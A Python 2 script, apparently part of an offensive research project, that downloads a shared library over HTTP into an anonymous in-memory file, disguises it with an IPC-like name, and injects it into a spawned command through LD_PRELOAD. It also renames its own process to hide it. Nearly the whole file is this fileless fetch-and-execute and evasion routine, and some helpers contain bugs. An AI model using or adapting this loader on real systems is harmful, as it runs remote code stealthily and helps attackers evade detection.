#!/usr/bin/env python
from __future__ import print_function # Only Python 2.x
import sys
import ctypes
import fcntl
import os
import subprocess 
import urllib2

from time import sleep
from getpass import getuser

filedata = urllib2.urlopen('http://i3.ytimg.com/vi/J---aiyznGQ/mqdefault.jpg')
datatowrite = filedata.read()

soMemPath=None

def my_pre_exec():
    os.setegid(1000)
    os.seteuid(1000)


def copyfile(src, dst):
    try:
        O_BINARY = os.O_BINARY
    except:
        O_BINARY = 0

    READ_FLAGS = os.O_RDONLY | O_BINARY
    WRITE_FLAGS = os.O_WRONLY | os.O_CREAT | os.O_TRUNC | O_BINARY
    BUFFER_SIZE = 128*1024


    try:
        fin = os.open(src, READ_FLAGS)
        stat = os.fstat(fin)
        fout = os.open(dst, WRITE_FLAGS, stat.st_mode)
        for x in iter(lambda: os.read(fin, BUFFER_SIZE), ""):
            os.write(fout, x)
            print("wrote: ", len(x))

    finally:
        try: os.close(fin)
        except: pass
        try: os.close(fout)
        except: pass


def fileToMemd(soPath):

    #/usr/include/asm/unistd_32.h:#define __NR_memfd_create 356
    #/usr/include/asm/unistd_64.h:#define __NR_memfd_create 319
    if ctypes.sizeof(ctypes.c_voidp) == 4:
       NR_memfd_create = 356
    else: 
       NR_memfd_create = 319


    soMemFd = ctypes.CDLL(None).syscall(NR_memfd_create,"/dev/shm/ipcs/0x88778848",1)
    soMemPath = "/proc/" + str(os.getpid()) + "/fd/" + str(soMemFd)
    print("PID: ", os.getpid(), "Mem path: ", soMemPath)
    copyfile(soPath, soMemPath)

    return soMemPath

def getSo(url):
    filed = urllib2.urlopen(url)
    data = filed.read()
    return data 


def urlToMemd(furl):

    #/usr/include/asm/unistd_32.h:#define __NR_memfd_create 356
    #/usr/include/asm/unistd_64.h:#define __NR_memfd_create 319
    if ctypes.sizeof(ctypes.c_voidp) == 4:
       NR_memfd_create = 356
    else:
       NR_memfd_create = 319


    soMemFd = ctypes.CDLL(None).syscall(NR_memfd_create,"/dev/shm/ipcs/0x88778848",1)
    soMemPath = "/proc/" + str(os.getpid()) + "/fd/" + str(soMemFd)
    print("PID: ", os.getpid(), "Mem path: ", soMemPath)

    fd = open(soMemPath, 'wb')
    data = getSo(furl)
    fd.write(data)

    return soMemPath





def fileToPipe(soPath, fPath):
    try:
       os.mkfifo(fPath)
    except OSError as e:
       pass

    sofile = open(soPath, 'rb')
    fd = sofile.fileno()
    flag = fcntl.fcntl(fd, fcntl.F_GETFD)
    fcntl.fcntl(fd, fcntl.F_SETFL, flag | os.O_NONBLOCK)

    fileContent = sofile.read()

    pipe = open(fPath, 'wb' )
    pipe.write(fileContent)
    pipe.flush()

    try: close(sofile)
    except: pass

    return fPath

def fileToShm(soPath):


    soShmPath = "/dev/shm/" + os.path.basename(soPath) 
    print("About to copy %s to %s" % (soPath, soShmPath))
    copyfile(soPath, soMemPath)

    return soShmPath

def executeP(soPath):

    #sleep(100000000)
    ctypes.CDLL(soPath)
    #TODO: ctypes.CDLL('main.so',mode=ctypes.RTLD_GLOBAL)
    #TODO: ctypes.CDLL('dependent.so', mode=1) # RTLD_LAZY

def executePLD(soPath, cmd):
    os.environ["LD_PRELOAD"] = soPath

    print("launching ", cmd)
    popen = subprocess.Popen(cmd, 
			stdout=subprocess.PIPE, 
			stderr=subprocess.PIPE, 
                        cwd="/tmp",
			env=os.environ)
    print("PID: %s" % popen.pid)

    for stdout_line in iter(popen.stdout.readline, ""):
        yield stdout_line 

    popen.stdout.close()
    return_code = popen.wait()
    return_code




if __name__ == '__main__':

    if len(sys.argv) < 3:
        raise ValueError("Need file to preload")

    soPath = "/root/Code/zombieant/lib/libmctor.so"
    urlSoPath = "http://127.0.0.1:8080/libmctor.so"
    fPath = "/tmp/pypipe"

    pname=sys.argv[1]
    print("Process name: ", pname)

    cmd=sys.argv[2]
    print("Cmd: ", cmd)

    cmd_args=sys.argv[3:]
    print("Cmd Args from shell: ", cmd_args)

    cmd_popen = [cmd] + cmd_args
    print("Popen args are: ", cmd_popen)

    # Change process name (non-portable, incomplete...)
    sys.path.append("./ext")

    try:
       import setproctitle
       setproctitle.setproctitle(pname)
    except ImportError:
       pass


   
    soMemPath = urlToMemd(urlSoPath)
    print(soMemPath)
    #soMemPath = fileToMemd(soPath)
    #soShmPath = fileToShm(soPath)
    #soPipePath = fileToPipe(soPath,"/tmp/pypipe")

    eSoPath = soMemPath
    #sleep(100000)


    #executeP(eSoPath)

    for line in executePLD(eSoPath, cmd_popen):
        print(line, end="")

